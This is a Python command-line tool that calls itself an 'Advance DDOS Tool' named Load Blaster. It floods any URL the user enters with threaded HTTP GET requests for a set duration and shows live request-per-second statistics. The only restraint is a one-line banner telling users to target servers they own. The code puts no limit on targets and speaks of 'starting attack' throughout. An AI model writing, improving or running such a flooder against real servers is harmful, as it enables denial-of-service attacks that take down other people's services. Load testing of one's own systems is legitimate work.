import requests
import threading
import time
from colorama import Fore, Style, init
import pyfiglet
import os
import sys

# Initialize colorama
init(autoreset=True)

# Shared counters
total_requests = 0
failed_requests = 0
stop_attack = False
lock = threading.Lock()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def welcome_message():
    clear_screen()
    ascii_banner = pyfiglet.figlet_format("Load Blaster")
    print(Fore.CYAN + ascii_banner)
    print(Fore.GREEN + "="*60)
    print(Fore.YELLOW + "   🚀 Load Blaster Advance DDOS Tool🚀")
    print(Fore.GREEN + "="*60)
    print(Fore.CYAN + "Use this tool ONLY on servers you own or control!\n")

# Function to send requests
def flood(url, duration, delay):
    global total_requests, failed_requests, stop_attack
    start_time = time.time()
    stop_attack = False

    def single_request():
        global total_requests, failed_requests
        try:
            response = requests.get(url, timeout=5)
            with lock:
                total_requests += 1
        except requests.exceptions.RequestException:
            with lock:
                failed_requests += 1

    # Dashboard updater
    def dashboard():
        prev_total = 0
        while (time.time() - start_time) < duration and not stop_attack:
            time.sleep(1)
            with lock:
                sent = total_requests
                failed = failed_requests
            rps = sent - prev_total
            prev_total = sent
            clear_screen()
            ascii_banner = pyfiglet.figlet_format("Stress Tool")
            print(Fore.CYAN + ascii_banner)
            print(Fore.GREEN + "="*60)
            print(Fore.YELLOW + f"Target: {url}")
            print(Fore.YELLOW + f"Duration: {duration} sec | Delay: {delay} sec")
            print(Fore.GREEN + "="*60)
            print(Fore.CYAN + f"📊 Requests Sent: {sent}")
            print(Fore.CYAN + f"📉 Failed Requests: {failed}")
            print(Fore.CYAN + f"⚡ Requests per Second (RPS): {rps}")
            print(Fore.GREEN + "="*60)
            print(Fore.RED + "Press 's' + Enter anytime to stop the attack early.")

    # Input listener
    def stop_listener():
        global stop_attack
        while (time.time() - start_time) < duration and not stop_attack:
            choice = input()
            if choice.lower() == 's':
                stop_attack = True
                break

    # Start dashboard + listener in threads
    dash_thread = threading.Thread(target=dashboard, daemon=True)
    listener_thread = threading.Thread(target=stop_listener, daemon=True)
    dash_thread.start()
    listener_thread.start()

    while (time.time() - start_time) < duration and not stop_attack:
        t = threading.Thread(target=single_request)
        t.start()
        time.sleep(delay)

    dash_thread.join(timeout=1)
    listener_thread.join(timeout=1)

# Main function
def main():
    global total_requests, failed_requests
    welcome_message()

    while True:
        print(Fore.CYAN + "\nOptions:")
        print("1. Start Stress Test")
        print("2. Exit")

        choice = input(Fore.YELLOW + "Choose an option: ")

        if choice == '1':
            url = input(Fore.YELLOW + "Enter the target URL (e.g. http://127.0.0.1:5000/): ")
            try:
                duration = int(input(Fore.YELLOW + "Enter duration (seconds): "))
                delay = float(input(Fore.YELLOW + "Enter delay between requests (seconds, e.g. 0.1): "))
            except ValueError:
                print(Fore.RED + "❌ Invalid input. Please enter valid numbers.")
                continue

            print(Fore.MAGENTA + f"\n🚀 Starting Attack on {url} for {duration} seconds...")
            print(Fore.RED + "👉 Tip: Press 's' + Enter anytime to stop early!\n")
            flood(url, duration, delay)

            print(Fore.CYAN + "="*60)
            print(Fore.GREEN + f"✅ Test finished. Total Requests: {total_requests}, Failed: {failed_requests}")
            print(Fore.CYAN + "="*60)

            another_attack = input(Fore.YELLOW + "\nDo you want to perform another test? (y/n): ")
            if another_attack.lower() != 'y':
                break
            else:
                total_requests, failed_requests = 0, 0
                welcome_message()

        elif choice == '2':
            print(Fore.GREEN + "👋 Exiting the tool. Goodbye!")
            break
        else:
            print(Fore.RED + "❌ Invalid choice. Try again.")

if __name__ == "__main__":
    main()
